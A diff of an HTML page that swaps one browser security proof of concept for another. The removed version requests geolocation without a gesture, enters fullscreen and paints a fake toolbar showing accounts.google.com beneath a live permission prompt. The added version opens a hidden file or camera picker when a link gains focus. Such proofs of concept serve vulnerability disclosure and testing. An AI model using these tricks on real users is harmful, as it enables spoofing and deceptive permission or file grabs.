@@ -1,76 +1,45 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Click to play</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <style>
-  html, body { margin:0; padding:0; height:100%; background:#111; color:#eee;
-               font-family: Arial, sans-serif; }
-  #stage { position:absolute; inset:0; display:flex; align-items:center;
-           justify-content:center; cursor:pointer; }
-  #stage h1 { font-size:48px; }
+    h1 {
+        margin: 1em;
+    }
 
-  /* Spoofed browser chrome painted by the page once in fullscreen.
-     A real attack would pixel-match the user's OS theme; this is illustrative. */
-  #fake-chrome { position:fixed; top:0; left:0; right:0; height:76px;
-                 background:#202124; display:none; z-index:2; }
-  #fake-tabstrip { height:36px; background:#202124; }
-  #fake-omnibox { margin:6px 8px; height:28px; border-radius:14px;
-                  background:#3c4043; line-height:28px; padding:0 14px;
-                  font-size:14px; color:#e8eaed; }
-  #fake-omnibox::before { content:"\1F512  "; }   /* lock icon */
+    a {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+    }
+
+    input {
+        display: none;
+    }
+
+    img {
+        width: 100%;
+    }
 </style>
-</head>
-<body>
 
-<div id="fake-chrome">
-  <div id="fake-tabstrip"></div>
-  <div id="fake-omnibox">https://accounts.google.com</div>
-</div>
 
-<div id="stage"><h1>&#9658; Click to play</h1></div>
+<!-- [poc-with-system-dialog]: -->
+<input id="fileSelect" type="file" accept="image/*" />
+
+<!-- [poc-with-camera]: -->
+<!-- <input id="fileSelect" type="file" accept="*/*" /> -->
+
+<img id="img">
+<center><a id="link" href="https://www.google.com" target="_blank">Click Here</a></center>
 
 <script>
-function log(s) {
-  console.error("[poc] " + s);   // surfaces in --enable-logging=stderr
-  document.title = s;
-}
+    link.onfocus = () => {	
 
-// Step 1: request a permission with NO user gesture.
-// HasUserGesture()==false  =>  ShouldUseChip()==false
-//   =>  PermissionPromptBubble path (not the chip path).
-// IsTabFullscreen()==false  =>  fullscreen_blocker_ is NOT acquired.
-window.addEventListener("DOMContentLoaded", () => setTimeout(() => {
-  log("requesting geolocation (no user gesture)");
-  navigator.geolocation.getCurrentPosition(
-      _ => log("geolocation granted"),
-      e => log("geolocation error: " + e.message));
-}, 500));
+        setTimeout(function(){fileSelect.click();}, 2500);
 
-// Step 2: on the user's first click anywhere, enter HTML5 fullscreen.
-// Because fullscreen_blocker_count_==0 for this WebContents,
-// CanEnterFullscreenMode() passes and the toolbar/omnibox are hidden
-// while the live permission bubble remains anchored at top-left.
-document.getElementById("stage").addEventListener("click", async () => {
-  log("user click -> requestFullscreen()");
-  try {
-    await document.documentElement.requestFullscreen();
-  } catch (e) {
-    log("requestFullscreen rejected: " + e.message);
-    return;
-  }
-});
+    }
 
-document.addEventListener("fullscreenchange", () => {
-  if (document.fullscreenElement) {
-    // Step 3: paint a spoofed omnibox under the still-live permission bubble.
-    document.getElementById("fake-chrome").style.display = "block";
-    log("ENTERED FULLSCREEN with permission bubble still showing -> spoofed chrome painted");
-  } else {
-    document.getElementById("fake-chrome").style.display = "none";
-    log("left fullscreen");
-  }
-});
+    fileSelect.onchange = (event) => {
+        img.src = URL.createObjectURL(fileSelect.files[0]);
+    }
 </script>
-</body>
-</html>
